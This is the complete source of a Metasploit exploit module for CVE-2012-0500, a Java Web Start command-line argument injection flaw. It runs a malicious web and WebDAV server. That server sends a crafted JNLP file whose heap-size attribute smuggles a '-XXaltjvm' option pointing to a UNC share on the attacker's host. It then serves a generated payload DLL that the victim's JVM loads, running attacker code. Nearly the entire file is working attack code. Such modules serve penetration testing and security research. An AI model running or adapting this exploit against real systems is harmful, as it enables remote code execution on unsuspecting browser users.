##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  #
  # This module acts as an HTTP server
  #
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sun Java Web Start Plugin Command Line Argument Injection (2012)',
      'Description'    => %q{
          This module exploits a flaw in the Web Start component of the Sun Java
        Runtime Environment. The arguments passed to Java Web Start are not properly
        validated, allowing injection of arbitrary arguments to the JVM.

        By utilizing the lesser known -J option, an attacker can take advantage of
        the -XXaltjvm option, as discussed previously by Ruben Santamarta. This method
        allows an attacker to execute arbitrary code in the context of an unsuspecting
        browser user.

        In order for this module to work, it must be ran as root on a server that
        does not serve SMB. Additionally, the target host must have the WebClient
        service (WebDAV Mini-Redirector) enabled.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'jduck', # Bug reported to Oracle by TELUS
      'Version'        => '$Revision$',
      'References'     =>
        [
          [ 'CVE', '2012-0500' ],
          [ 'OSVDB', '79227' ],
          [ 'BID', '52015' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2012/Feb/251' ],
          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html' ]
        ],
      'Platform'       => 'win',
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => '',
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff"
        },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
          [ 'Java Runtime on Windows x86',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 14 2012'
      ))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The daemon port to listen on", 80 ]),
        OptString.new('URIPATH', [ true, "The URI to use.", "/" ]),
        OptString.new('UNCPATH', [ false, 'Override the UNC path to use. (Use with an SMB server)' ])
      ], self.class)
  end


  def auto_target(cli, request)
    agent = request.headers['User-Agent']

    ret = nil
    #print_status("Agent: #{agent}")
    # Check for MSIE and/or WebDAV redirector requests
    if agent =~ /(Windows NT (5|6)\.(0|1|2)|MiniRedir\/(5|6)\.(0|1|2))/
      ret = targets[1]
    elsif agent =~ /MSIE (6|7|8)\.0/
      ret = targets[1]
    else
      print_status("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
    end

    ret
  end


  def on_request_uri(cli, request)

    # For this exploit, this does little besides ensures the user agent is a recognized one..
    mytarget = target
    if target.name == 'Automatic'
      mytarget = auto_target(cli, request)
      if (not mytarget)
        send_not_found(cli)
        return
      end
    end

    # Special case to process OPTIONS for /
    if (request.method == 'OPTIONS' and request.uri == '/')
      process_options(cli, request, mytarget)
      return
    end

    # Discard requests for ico files
    if (request.uri =~ /\.ico$/i)
      send_not_found(cli)
      return
    end

    # If there is no subdirectory in the request, we need to redirect.
    if (request.uri == '/') or not (request.uri =~ /\/([^\/]+)\//)
      if (request.uri == '/')
        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
      else
        subdir = request.uri + '/'
      end
      print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
      send_redirect(cli, subdir)
      return
    else
      share_name = $1
    end

    # dispatch WebDAV requests based on method first
    case request.method
    when 'OPTIONS'
      process_options(cli, request, mytarget)

    when 'PROPFIND'
      process_propfind(cli, request, mytarget)

    when 'GET'
      process_get(cli, request, mytarget, share_name)

    when 'PUT'
      print_status("Sending 404 for PUT #{request.uri} ...")
      send_not_found(cli)

    else
      print_error("Unexpected request method encountered: #{request.method}")

    end

  end

  #
  # GET requests
  #
  def process_get(cli, request, target, share_name)

    print_status("Responding to \"GET #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
    # dispatch based on extension
    if (request.uri =~ /\.dll$/i)
      #
      # DLL requests sent by IE and the WebDav Mini-Redirector
      #
      print_status("Sending DLL to #{cli.peerhost}:#{cli.peerport}...")

      # Re-generate the payload
      return if ((p = regenerate_payload(cli)) == nil)

      # Generate a DLL based on the payload
      dll_data = generate_payload_dll({ :code => p.encoded })

      # Send it :)
      send_response(cli, dll_data, { 'Content-Type' => 'application/octet-stream' })

    elsif (request.uri =~ /\.jnlp$/i)
      #
      # Send the jnlp document
      #

      # Prepare the UNC path...
      if (datastore['UNCPATH'])
        unc = datastore['UNCPATH'].dup
      else
        my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
        unc = "\\\\" + my_host + "\\" + share_name
      end

      # NOTE: we ensure there's only a single backslash here since it will get escaped
      if unc[0,2] == "\\\\"
        unc.slice!(0, 1)
      end

      http_agent = Rex::Text.rand_text_alpha(8+rand(8))

      jnlp_data = <<-EOS
<?xml version="1.0" encoding="UTF-8"?>
<jnlp version="1">
<information>
   <title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>
   <vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>
   <description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description>
</information>
<resources>
   <java version="1.3+" initial-heap-size='512m" -J-XXaltjvm=#{unc} "' />
</resources>
<resources><java java-vm-args='-Dhttp.agent=#{http_agent}"' /></resources>
</jnlp>
EOS
      print_status("Sending JNLP to #{cli.peerhost}:#{cli.peerport}...")
      send_response(cli, jnlp_data, { 'Content-Type' => 'application/x-java-jnlp-file' })

    else
      print_status("Sending redirect to the JNLP file to #{cli.peerhost}:#{cli.peerport}")
      jnlp_name = Rex::Text.rand_text_alpha(8 + rand(8))

      jnlp_path = get_resource()
      if jnlp_path[-1,1] != '/'
        jnlp_path << '/'
      end
      jnlp_path << request.uri.split('/')[-1] << '/'
      jnlp_path << jnlp_name << ".jnlp"

      send_redirect(cli, jnlp_path, '')

    end

  end

  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request, target)
    print_status("Responding to WebDAV \"OPTIONS #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
    headers = {
      #'DASL'   => '<DAV:sql>',
      #'DAV'    => '1, 2',
      'Allow'  => 'OPTIONS, GET, PROPFIND',
      'Public' => 'OPTIONS, GET, PROPFIND'
    }
    send_response(cli, '', headers)
  end


  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request, target)
    path = request.uri
    print_status("Received WebDAV \"PROPFIND #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
    body = ''

    if (path =~ /\.dll$/i)
      # Response for the DLL
      print_status("Sending DLL multistatus for #{path} ...")
#<lp1:getcontentlength>45056</lp1:getcontentlength>
      body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

    elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
      # Response for anything else (generally just /)
      print_status("Sending directory multistatus for #{path} ...")
      body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

    else
      print_status("Sending 404 for #{path} ...")
      send_not_found(cli)
      return

    end

    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end


  #
  # Make sure we're on the right port/path to support WebDAV
  #
  def exploit
    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
      raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'
    end

    super
  end

end
